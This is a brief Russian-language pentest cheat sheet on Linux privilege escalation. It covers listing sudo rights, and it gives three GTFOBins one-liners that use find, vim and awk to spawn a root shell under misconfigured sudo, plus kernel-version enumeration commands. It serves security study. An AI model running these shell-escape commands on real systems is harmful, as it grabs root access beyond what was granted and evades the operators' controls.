### Sudo Misconfiguration

Анализ команд, выполняемых из-под sudo:
```bash
sudo -l
```


Команды + GTFObins:
```bash
sudo find /etc/passwd -exec /bin/sh \;

sudo vim -c '!sh'

sudo awk 'BEGIN {system("/bin/sh")}'
```

### Kernel Exploits

Заключается в том, чтобы найти устаревшие версии ядра

Узнаем информацию о ядре:
```bash
uname -a

cat /etc/lsb-release
```
